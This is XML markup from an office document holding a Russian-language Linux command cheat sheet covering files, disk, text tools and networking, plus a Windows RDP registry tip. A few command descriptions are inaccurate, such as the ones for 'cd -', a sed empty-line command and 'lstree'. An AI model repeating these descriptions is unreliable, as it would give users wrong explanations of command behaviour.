      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> . -</text:span><text:span text:style-name="T3">maxdepth</text:span><text:span text:style-name="T1"> 1 -</text:span><text:span text:style-name="T3">name</text:span><text:span text:style-name="T1"> *.</text:span><text:span text:style-name="T3">jpg</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">print</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">exec</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">convert</text:span><text:span text:style-name="T1"> - Найти в текущей директории все файлы с расширением </text:span><text:span text:style-name="T3">jpg</text:span><text:span text:style-name="T1"> и выполнить для каждого команду </text:span><text:span text:style-name="T3">convert</text:span><text:span text:style-name="T1"> ( </text:span><text:span text:style-name="T3">Imagemagick</text:span><text:span text:style-name="T1"> )</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">to</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">name</text:span><text:span text:style-name="T1"> \*.</text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1"> - Найти все директории и файлы, имена которых оканчиваются на ".с". Поиск будет производиться, начиная с директории /</text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">to</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">dir</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> / -</text:span><text:span text:style-name="T3">name</text:span><text:span text:style-name="T1"> *.</text:span><text:span text:style-name="T3">rpm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">exec</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> 755 '{}' \; - Начиная с корня, найти все фалы и директории, имена которых оканчиваются на ".</text:span><text:span text:style-name="T3">rpm</text:span><text:span text:style-name="T1">", и для каждого изменить права доступа</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">whereis</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> - Вывод полных путей к бинарным файлам, файлом исходных кодов и руководств, имеющих отношение к файлу </text:span><text:span text:style-name="T3">ls</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">locate</text:span><text:span text:style-name="T1"> \*.</text:span><text:span text:style-name="T3">ps</text:span><text:span text:style-name="T1"> - Поиск всех файлов, содержащих в имени ".</text:span><text:span text:style-name="T3">ps</text:span><text:span text:style-name="T1">" по специальной базе данных, предварительно сформированной командой </text:span><text:span text:style-name="T3">updatedb</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">which</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> - Вывести полный путь до файла </text:span><text:span text:style-name="T3">ls</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Работа с файлами и папками</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">pwd</text:span><text:span text:style-name="T1"> - Вывести текущую директорию</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1"> - Перейти в директорию /</text:span><text:span text:style-name="T3">home</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> .. - Перейти в родительский каталог, то есть подняться на уровень выше</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> ../.. - Подняться в дереве каталогов на два уровня</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> - Перейти в домашний каталог</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> ~</text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1"> - Перейти в домашний каталог пользователя </text:span><text:span text:style-name="T3">user</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> - - Перейти в предыдущую директорию, из которой был сделан переход в текущую директорию</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cp</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1">_1 </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1">_2 - Копировать директорию </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1">_1 в директорию </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1">_2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cp</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">_1 </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">_2 - Копировать файл </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">_1 в файл </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">_2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cp</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">tmp</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1"> . - копировать директорию </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1"> и все ее содержимое в текущую директорию</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cp</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1">/* . - Копировать все файлы, содержащиеся в директории </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1"> в текущую директорию</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">iconv</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> - Выводит список доступных для использования кодировок</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">iconv</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">windows</text:span><text:span text:style-name="T1">-1251 -</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">utf</text:span><text:span text:style-name="T1">-8 </text:span><text:span text:style-name="T3">inputFile</text:span><text:span text:style-name="T1"> &gt; </text:span><text:span text:style-name="T3">outputFile</text:span><text:span text:style-name="T1"> - Конвертировать файл из кодировки </text:span><text:span text:style-name="T3">windows</text:span><text:span text:style-name="T1">-1251 в кодировку </text:span><text:span text:style-name="T3">utf</text:span><text:span text:style-name="T1">-8</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ln</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">to</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">filedir</text:span><text:span text:style-name="T1"> ./</text:span><text:span text:style-name="T3">link</text:span><text:span text:style-name="T1"> - Создать в текущей директории символическую ссылку </text:span><text:span text:style-name="T3">link</text:span><text:span text:style-name="T1"> на директорию или файл </text:span><text:span text:style-name="T3">filedir</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ln</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">to</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">filedir</text:span><text:span text:style-name="T1"> ./</text:span><text:span text:style-name="T3">link</text:span><text:span text:style-name="T1"> - Создать в текущей директории жесткую ссылку </text:span><text:span text:style-name="T3">link</text:span><text:span text:style-name="T1"> на директорию или файл </text:span><text:span text:style-name="T3">filedir</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> - Вывести листинг содержимого текущей директории</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">F</text:span><text:span text:style-name="T1"> - Листинг текущей директории с добавлением к именам символов, обозначающих тип объекта</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> - Листинг текущей директории с подробностями по каждому объекту ( права доступа, владелец, группа, дата, размер )</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> - Кроме обычных объектов, вывести в листинге, скрытые файлы и директории, текущего каталога</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">tmp</text:span><text:span text:style-name="T1"> | </text:span><text:span text:style-name="T3">pr</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">T</text:span><text:span text:style-name="T1">5 -</text:span><text:span text:style-name="T3">W</text:span><text:span text:style-name="T1">$</text:span><text:span text:style-name="T3">COLUMNS</text:span><text:span text:style-name="T1"> - Листинг директории /</text:span><text:span text:style-name="T3">tmp</text:span><text:span text:style-name="T1"> в 5 колонок</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> *[0-9]* - Вывести в листинг файлов и директорий текущего каталога, содержащие в имени цифровые символы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">lstree</text:span><text:span text:style-name="T1"> - Листинг иерархии директорий и файлов, начиная с корневого каталога (/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mkdir</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1"> - Создать в текущем каталоге, директорию с именем </text:span><text:span text:style-name="T3">dir</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mkdir</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">_1 </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">_2 - Создать в текущем каталоге две директории, с именами </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">_1 и </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">_2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mkdir</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">p</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">to</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1"> - Создать иерархию директорий. Кроме самой директории </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1"> будут созданы все промежуточные директории</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mv</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">filedir</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">filedir</text:span><text:span text:style-name="T1"> - Переместить ( переименовать ) файл или директорию из </text:span><text:span text:style-name="T3">filedir</text:span><text:span text:style-name="T1"> в </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">filedir</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">rm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">rf</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1"> - Рекурсивно удалить директорию </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1"> и всё её содержимое, без запроса подтверждения на удаление</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">rm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Удалить файл </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">, без запроса подтверждения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">rm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">rf</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">_1 /</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">_2 - Удалить директории /</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">_1 и /</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">_2 вместе с содержимым, без запроса подтверждения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">rmdir</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1"> - Удалить директорию /</text:span><text:span text:style-name="T3">dir</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">tree</text:span><text:span text:style-name="T1"> - Вывести иерархию директорий и файлов, начиная с корневой (/)</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">touch</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> 0712250000 </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 - Изменить дату и время создания файла, если указанный файл не существует, создать его с указанными датой и временем (</text:span><text:span text:style-name="T3">YYMMDDhhmm</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Дисковое пространство</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">df</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">h</text:span><text:span text:style-name="T1"> - Вывод информации о свободном и занятом дисковом пространстве на смонтированных разделах, в формате, удобном для чтения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">dpkg</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">query</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">W</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1">='${</text:span><text:span text:style-name="T3">Installed</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">Size</text:span><text:span text:style-name="T1">;10}</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1">${</text:span><text:span text:style-name="T3">Package</text:span><text:span text:style-name="T1">}</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1">' | </text:span><text:span text:style-name="T3">sort</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">k</text:span><text:span text:style-name="T1">1,1</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> - Выводит объем используемого дискового пространства, занятого файлами </text:span><text:span text:style-name="T3">deb</text:span><text:span text:style-name="T1">-пакета, с сортировкой по размеру (</text:span><text:span text:style-name="T3">ubuntu</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">debian</text:span><text:span text:style-name="T1"> т.п.)</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">du</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">sh</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1"> - Выводит объем дискового пространства, занимаемый директорией </text:span><text:span text:style-name="T3">dir</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">du</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">sk</text:span><text:span text:style-name="T1"> * | </text:span><text:span text:style-name="T3">sort</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">rn</text:span><text:span text:style-name="T1"> - Выводит листинг файлов и директорий с размером, сортируя его по размеру</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">lSr</text:span><text:span text:style-name="T1"> | </text:span><text:span text:style-name="T3">more</text:span><text:span text:style-name="T1"> - Выводит листинг файлов и директорий, сортируя по возрастанию размера и перенаправляет его в программу </text:span><text:span text:style-name="T3">more</text:span><text:span text:style-name="T1"> для постраничного просмотра</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">rpm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">q</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> --</text:span><text:span text:style-name="T3">qf</text:span><text:span text:style-name="T1"> '%10{</text:span><text:span text:style-name="T3">SIZE</text:span><text:span text:style-name="T1">}</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1">%{</text:span><text:span text:style-name="T3">NAME</text:span><text:span text:style-name="T1">}</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1">' | </text:span><text:span text:style-name="T3">sort</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">k</text:span><text:span text:style-name="T1">1,1</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> - Выводит объем дискового пространства, занимаемого файлами </text:span><text:span text:style-name="T3">rpm</text:span><text:span text:style-name="T1">-пакета, с сортировкой по размеру ( </text:span><text:span text:style-name="T3">fedora</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">redhat</text:span><text:span text:style-name="T1"> и т.п.)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Долгое завершение </text:span><text:span text:style-name="T3">rdp</text:span><text:span text:style-name="T1"> сессии</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Очень часто, долго завершается терминальная сессия. Виноват какой то процесс, долго выполняющий свое закрытие. Чаще всего это - </text:span><text:span text:style-name="T3">SplWOW</text:span><text:span text:style-name="T1">64.</text:span><text:span text:style-name="T3">exe</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Для его принудительного, быстрого завершения, необходимо добавить ветку реестра</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\SysProcs"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">DWORD</text:span><text:span text:style-name="T1">: </text:span><text:span text:style-name="T3">SPLWOW</text:span><text:span text:style-name="T1">64.</text:span><text:span text:style-name="T3">EXE</text:span><text:span text:style-name="T1"> = 0</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Таким же способом добавляется любая программа, которая долго выполняет закрытие.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Просмотр содержимого файлов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># cat file1 - Вывести все содержимое файла начиная с первой строки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># head -2 file1 - Отобразить две первые строки файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># tac file1 - Отобразить содержимое файла начиная с последней строки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># tail -f /var/log/messages - В реальном времени выводить все, что добавляется в файл</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># tail -2 file1 - Вывести две последние строки файла</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># more file1 - Отобразить содержимое файла постранично</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># less file1 - Аналогична команде more но позволяет перемещаться по содержимому вперед и назад</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Полезные команды Linux. Анализ файловой системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># badblocks -v /dev/hda1 - Проверить раздел hda1 на наличие bad-блоков</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># fsck /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность linux-файловой системы раздела hda1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># fsck.ext2 /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext2 раздела hda1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># fsck.msdos /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы fat раздела hda1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># fsck.vfat /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы fat раздела hda1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># fsck.ext3 /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext3 раздела hda1</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># dosfsck /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы fat, раздела hda1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># e2fsck /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext2 раздела hda1</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">#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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Манипуляции с текстом</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># cat -n file1 - Вывести содержимое файла, нумеруя выводимые строки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># cat example.txt | awk 'NR%2==1' - Вывести только не четные строки файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># echo a b c | awk '{print $1,$3}' - Вывести первую и третью колонки. Разделение, по-умолчанию, по пробельным символам или символу табуляции</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># echo a b c | awk '{print $1}' - Вывести первую колонку содержимого файла. Разделение, по-умолчанию, по пробельным символам или символу табуляции</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># comm -3 file1 file2 - Сравнить содержимое двух файлов, удаляя строки встречающиеся в обоих файлах</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># comm -1 file1 file2 - Сравнить содержимое двух файлов, не отображая строки принадлежащие файлу file1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># comm -2 file1 file2 - Сравнить содержимое двух файлов, не отображая строки принадлежащие файлу file2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># grep [0-9] /var/log/messages - Отобрать и вывести строки содержащие цифровые символы из файла /var/log/messages</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># grep ^Aug /var/log/messages - Отобрать и вывести строки, начинающиеся с сочетания символов "Aug", из файла /var/log/messages</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># grep Aug /var/log/messages - Отобрать и вывести строки, содержащие сочетание символов "Aug" из файла /var/log/messages</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># grep Aug -R /var/log/* - Отобрать и вывести строки, содержащие сочетание символов "Aug", из всех файлов, расположенных в директории /var/log и ниже</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># paste -d '+' file1 file2 - Объединить содержимое file1 и file2 в виде таблицы с разделителем "+"</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># paste file1 file2 - Объединить содержимое file1 и file2 в виде таблицы: строка 1 из file1 = строка 1 колонка 1-n, строка 1 из file2 = строка 1 колонка n+1-m</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sdiff file1 file2 - Сравнить содержимое двух файлов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sed 's/string1/string2/g' example.txt - Заменить string1 на string2 в файле example.txt и вывести содержимое</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sed '/ *#/d; /^$/d' example.txt - Удалить пустые строки и комментарии из файла example.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sed '/^$/d' example.txt - Удалить пустые строки и комментарии из файла example.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sed -e '1d' exampe.txt - Удалить первую строку из файла example.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># sed -n '/string1/p' - Отобразить только строки содержащие string1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sed -e 's/string//g' example.txt - Удалить строку string1 из текста файла example.txt не изменяя всего остального</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sed -e 's/ *$//' example.txt - Удалить пустые символы в конце каждой строки файла example.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sed -n '5p;5q' example.txt - Вывести пятую строку</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sed -n '2,5p' example.txt - Вывести строки со второй по пятую</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sed -e 's/00*/0/g' example.txt - Заменить последовательность из любого количества нулей одним нулём</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sort file1 file2 - Вывести отсортированное содержимое двух файлов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sort file1 file2 | uniq - Вывести отсортированное содержимое двух файлов исключая повторные значения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sort file1 file2 | uniq -u - Вывести уникальные значения из отсортированного содержимого двух файлов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># sort file1 file2 | uniq -d - Вывести только повторяющиеся значения из отсортированного содержимого двух файлов</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># echo 'word' | tr '[:lower:]' '[:upper:]' - Перевести символы нижнего регистра в верхний</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сети (LAN / WiFi)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># dhclient eth0 - Включить DHCP на сетевом интерфейсе eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ethtool eth0 - Вывод статистики по сетевому интерфейсу eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># hostname - Вывести имя компьютера</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># host www.example.com - Преобразовать домен www.example.org в ip-адрес и наоборот</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ifconfig eth0 - Вывести настройки сетевой карты eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ifconfig eth0 promisc - Переключить интерфейс eth0 в promiscuous-режим для сбора ( сниффинг ) сетевых пакетов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ifup eth0 - Включить сетевой интерфейс eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ifdown eth0 - Отключить сетевой интерфейс eth0</text:span></text:p>
